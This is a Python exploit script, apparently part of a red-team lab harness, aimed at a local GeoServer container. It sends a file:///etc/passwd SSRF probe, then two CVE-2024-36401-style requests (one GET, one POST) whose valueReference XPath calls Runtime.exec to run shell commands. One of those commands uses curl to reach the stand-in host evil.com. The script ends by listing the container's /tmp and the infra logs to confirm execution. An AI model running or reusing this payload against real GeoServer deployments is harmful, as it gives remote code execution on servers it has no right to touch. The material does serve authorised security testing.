# -*- coding: utf-8 -*-
"""RT-4 GeoServer: file:// negative control + CVE-2024-36401-style valueReference XPath eval RCE attempts."""
import os
import subprocess
import sys

import requests  # noqa: E402
import urllib3  # noqa: E402

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18082"
s = requests.Session()
s.trust_env = False
s.verify = False


def ssrf(url, host_header, body=None, uri="/geoserver/TestWfsPost", label=""):
    data = {"url": url}
    if body:
        data["body"] = body
    r = s.post(BASE + uri, data=data, headers={"Host": host_header}, timeout=60)
    txt = r.text
    if len(txt) > 400:
        txt = txt[:200] + "...[" + str(len(txt)) + "B]..." + txt[-200:]
    print("[*] %-38s HTTP %s | %s" % (label, r.status_code, txt.replace("\n", " ")[:380]))
    return r


# RV-b: file:// negative control (R0: rejected by app-side validation)
ssrf("file:///etc/passwd", "127.0.0.1:18082", label="RV file:// (expect reject)")

# GS-1: CVE-2024-36401-style RCE via WFS GetPropertyValue valueReference (GET, /ows)
xpath = "exec(java.lang.Runtime.getRuntime(),new java.lang.String[]{'/bin/sh','-c','touch /tmp/start_rt4_gs_a1; touch /tmp/hsperfdata_root/pwn_rt4_gs_a2; curl -m 5 -s http://evil.com:8000/rt/rt4_gs_a3'})"
r = s.get(BASE + "/geoserver/ows", params={
    "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
    "typeNames": "sf:archsites", "valueReference": xpath,
}, timeout=60)
txt = r.text
if len(txt) > 500:
    txt = txt[:250] + "...[" + str(len(txt)) + "B]..." + txt[-250:]
print("[*] GS-1 GetPropertyValue sf:archsites  HTTP %s | %s" % (r.status_code, txt.replace("\n", " ")[:600]))

# GS-2: same via POST GetFeature with filter (fallback shape)
body = (
    '<wfs:GetPropertyValue xmlns:sf="http://cite.opengeospatial.org/gmlsf"'
    ' xmlns:wfs="http://www.opengis.net/wfs/2.0"'
    ' service="WFS" version="2.0.0" valueReference="exec(java.lang.Runtime.getRuntime(),new java.lang.String[]{\x27/bin/sh\x27,\x27-c\x27,\x27touch /tmp/start_rt4_gs_b1\x27})">'
    '<wfs:Query typeNames="sf:archsites"/></wfs:GetPropertyValue>'
)
r = s.post(BASE + "/geoserver/ows", data=body,
           headers={"Content-Type": "application/xml"}, timeout=60)
txt = r.text
if len(txt) > 500:
    txt = txt[:250] + "...[" + str(len(txt)) + "B]..." + txt[-250:]
print("[*] GS-2 GetPropertyValue POST       HTTP %s | %s" % (r.status_code, txt.replace("\n", " ")[:600]))

print("\n=== truth ===")
for p in ("/tmp", "/tmp/hsperfdata_root"):
    r = subprocess.run(["docker", "exec", "multi-round-lab-geoserver-1", "ls", "-l", "--full-time", p],
                       capture_output=True, text=True)
    print(r.stdout + r.stderr)
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "6m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "rt4" in line:
        print("[infra] " + line)
